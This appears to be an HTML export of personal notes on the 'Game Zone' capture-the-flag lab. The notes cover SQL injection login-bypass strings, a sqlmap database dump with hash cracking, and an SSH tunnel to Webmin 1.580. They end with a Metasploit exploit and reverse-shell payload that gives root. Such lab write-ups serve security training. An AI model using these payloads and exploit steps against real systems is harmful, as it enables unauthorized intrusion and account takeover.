<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>game zone</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>game zone</h1><br/><p><strong>Game Zone</strong></p><p></p><p></p><p>What is the name of the image ?</p><p><strong>Agent47</strong></p><p></p><p>Open the Webserver at 10.10.169.69</p><p></p><p>We will first use manual sql injection to login.</p><p></p><p><strong>SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 -- -</strong></p><p>OR</p><p><strong>SELECT * FROM users WHERE username</strong> = &#39; or 1=1 -- -</p><p>OR</p><p><strong>SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 </strong>#</p><p>OR</p><p><strong>SELECT * FROM users WHERE username</strong> = &#39; or 1=1 #</p><p></p><p>We successfully logged in with blank username.</p><p></p><p>In the next page we face a game search page.</p><p>We start burpsuite and capture a test request</p><p>Then save it to <em><strong>request.txt</strong></em> for further usage by sqlmap</p><p></p><p>In part 2, we enumerate the search page with sqlmap.</p><p><strong>sqlmap -r request.txt --dbms=mysql --dump</strong></p><p></p><p>Here we have 2 options to use inbuilt password cracking. (use custom wordlist of rockyou.txt and crack the hash).</p><p>Or</p><p>after sqlmap running is done, we go to the temporary hash location which sqlmap created.</p><p>Then crack it using <em><strong>john</strong></em></p><p></p><p>Once we have the password we can ssh into the machine to get user flag</p><p></p><p></p><p></p><p><strong>Privelege Escalation</strong></p><p></p><p>ss -tulpn</p><p></p><p>To check socket information on target machine. We find CMS app webmin running on localhost.</p><p>We use SSH Reverse tunneling to access the app from our Kali machine browser.</p><p></p><p><em><strong>ssh -L 9999:localhost:10000 agent47@10.10.169.69</strong></em></p><p></p><p>Then we open mozilla and go to localhost:9999</p><p>we get to the CMS App webpage.</p><p></p><p>We login with <strong>agent47</strong> and <strong>videogamer124</strong></p><p></p><p></p><p>We discover the App version as Webmin 1.580</p><p></p><p>searchsplit webmin 1.580</p><p></p><p><img src="images/8-1.png" alt="images/8-1.png" /></p><p></p><p></p><p>We use metasploit console.</p><p></p><p><em><strong>use exploit/unix/webapp/webmin_show_cgi_exec</strong></em></p><p></p><p>we tried different payloads.(Almost all)</p><p><em><strong>show payloads</strong></em> : Will show compatible payload for the exploit.</p><p></p><p><strong>Following is the working Payload and option configuration</strong>:</p><p></p><p><em><strong>use payload cmd/unix/reverse</strong></em></p><p></p><p><strong>Options:</strong></p><p><img src="images/8-2.png" alt="images/8-2.png" /></p><p></p><p><strong>Note:</strong> Change these as per the image above RHOSTS,RPORT,PASSWORD,USERNAME,LHOST,LPORT,SSL</p><p></p><p>Once we run this we get a shell as root.</p><p>We get the root flag in /root directory.</p><p></p><p>Thanks !!</p></div>
</body>
</html>
